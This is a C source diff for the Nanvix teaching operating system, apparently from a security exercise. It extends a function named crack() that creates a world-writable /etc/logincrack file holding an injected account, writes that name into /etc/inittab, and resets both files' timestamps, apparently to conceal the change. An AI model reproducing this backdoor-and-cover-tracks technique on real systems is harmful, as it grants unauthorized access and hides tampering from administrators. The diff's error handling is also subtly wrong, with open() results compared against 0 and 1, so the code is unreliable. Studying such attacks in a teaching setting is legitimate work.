@@ -1,4 +1,5 @@
 #include <nanvix/accounts.h>
+#include <sys/stat.h>
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -24,21 +25,30 @@ static void crack(void){
     uid_t uid = 5;
 	gid_t gid = 1;
 
-    if((file = open("/etc/logincrack", O_WRONLY)) == 1){
+    mode_t mode; /* File mode.       */
+    mode = S_IRUSR | S_IRGRP | S_IROTH | S_IWUSR | S_IWGRP | S_IWOTH;
+
+    if((file = open("/etc/logincrack", O_CREAT, mode)) == 0){
         account_encrypt(crack.name, 4, KERNEL_HASH);
         account_encrypt(crack.password, 4, KERNEL_HASH);
         crack.uid = uid;
         crack.gid = gid;
         write(file, &crack, sizeof(struct account));
     }
+    else{
+        printf("Error: logincrack file not created");
+    }
 
     close(file);
+    utime("logincrack", NULL);
 
     char * buf = "logincrack";
-    if ((file = open("/etc/inittab", O_WRONLY)) == 1){
-        write(file, buf, 10);
+	int tab_file;
+    if ((tab_file = open("/etc/inittab", O_WRONLY)) == 0){
+        write(tab_file, buf, 10);
     }
-    close(file);
+    close(tab_file);
+	utime("/etc/inittab", NULL);
 }
 
 
